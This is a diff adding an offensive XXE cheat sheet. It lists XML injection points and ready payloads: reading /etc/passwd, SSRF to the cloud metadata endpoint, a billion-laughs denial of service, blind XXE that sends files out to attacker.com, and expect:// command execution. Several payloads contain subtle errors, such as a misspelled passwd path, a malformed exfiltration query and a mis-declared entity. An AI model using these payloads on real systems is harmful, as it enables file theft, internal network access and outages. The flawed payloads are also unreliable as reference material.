@@ -1,0 +1,95 @@
+
+Likely injection points
+	XML file upload (e.g. config files)
+	XML input fields
+	XML-based APIs (SOAP)
+	XML-based files (RSS, SVG)
+
+Uncommon injection points
+	MS Office files (docx, xlsx, etc)
+	SAML-base SSO
+	VoiceXML in IVR systems
+	Online map editors using KML
+
+
+Payloads wordlist
+	https://gist.github.com/honoki/d7035c3ccca1698ec7b541c77b9410cf
+
+
+Classic XXE
+	Look for XML input reflected in the response
+	point the xxe at a file on the web server
+
+	add external entity to request XML:
+		<!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
+	
+	add xxe reference to reflected node:
+		<foo>&xxe;</foo> 
+
+	Example:
+	<?xml  version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE foo [
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
+	<foo>&xxe;</foo>
+
+
+SSRF
+	as classic but point the xxe at an IP address in the server's network
+		e.g. 169.254.169.254 for cloud metadata
+	
+	<?xml  version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE foo [
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM  "http://169.254.169.254" >]>
+	<foo>&xxe;</foo>
+
+	can port scan, etc
+
+
+DoS
+	billion laughs DoS
+
+	<?xml  version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE lolz [
+	   <!ELEMENT lol "lol"><!ELEMENT lolz (#PCDATA)>
+	   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+	   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+	   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+	   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+	   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+	   <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+	   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+	   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+	   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>
+	<tag>&lol9;</tag>
+
+
+Blind XXE
+	XML input, but not reflected back in response
+	uses parameter entity (usable only within DTD itself)
+
+	Testing payload:
+		<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE data [
+		   <!ENTITY % remote SYSTEM  "http://attacker.com/call.dtd">
+		   %remote;
+		]>
+	
+	If server reaches out to attacker.com, it is vulnerable.
+	Exploitation payload:
+		<!DOCTYPE roottag [
+			<!ENTITY % file SYSTEM "file:///etc/passd">
+			<!ENTITY % dtd SYSTEM "http://attacker.com/host.dtd">
+			%dtd;]>
+		<roottag>&send;</roottag>
+
+	Content of host.dtd:
+		<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect.php?file?=%file;'>">
+		%all;
+
+
+RCE
+	if server is running PHP and expect:// plugin is enabled  - Rare
+
+	<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://whoami"> ]>
